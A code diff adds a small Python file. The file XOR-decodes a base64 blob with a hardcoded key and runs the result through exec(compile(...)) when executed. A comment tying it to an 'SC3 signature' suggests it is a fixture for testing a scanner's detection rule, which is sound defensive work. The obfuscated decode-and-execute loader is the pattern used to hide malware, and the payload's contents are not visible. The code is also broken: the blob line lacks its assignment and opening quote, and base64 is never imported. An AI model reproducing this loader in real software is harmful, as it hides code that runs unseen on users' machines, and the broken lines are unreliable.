@@ -1,0 +1,13 @@
+FxRl6gcj3v/XBHC6RjFuz3e1174Sdpp+IiE1GRZj3vuiBQXu90Ou+9Y1sFqWg77uhnSi6qYjD0sCsAFLl3KOn2d10Usy9gjbIiDlGxKTnm4GdABe9qIuP7cAYBoHUs6eZxEyWzciyrsmdWGLJzFuj5P3oDtGJgjbIiDlGxKTnm4GdABe9kIer9ZgZBrjB8srsIDlHhJz7u5moOHrFiJ6/iLg5ToCVgp/NxDhepPUOnsiIOUeEnaeH6LFkDqHMsr81SezOKQhCnuSIMLa8lYI2yIg5R4icZwqM4DhKpaibjsjIYQfEnZLmy56joJKnFYh2PyPhKJ3mxpjYOl1W5rxoRCA5R4Scm9LxhRhyuY2H3viIeHvczfa6YCEoUpyck5vtsBlj7DWmnsiJxGK90Peb+bnESs2gnr7sIDlHhJxbu/HFaEK1rFubndkYapH5hrpgIRxfhWBbp829LLp4ndLqyIHEurGYg6c1dDEvLJ2mnsm9PGK8vYI0="
+_K = bytes.fromhex("2e71c10749879202")
+
+def _xor(buf, k):
+    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))
+
+def _decode():
+    raw = base64.b64decode(_BLOB)
+    return _xor(raw, _K).decode("utf-8")
+
+if __name__ == "__main__":
+    # SC3 signature: base64.b64decode(...) -> exec / compile near by
+    exec(compile(_decode(), "<runtime>", "exec"), {})
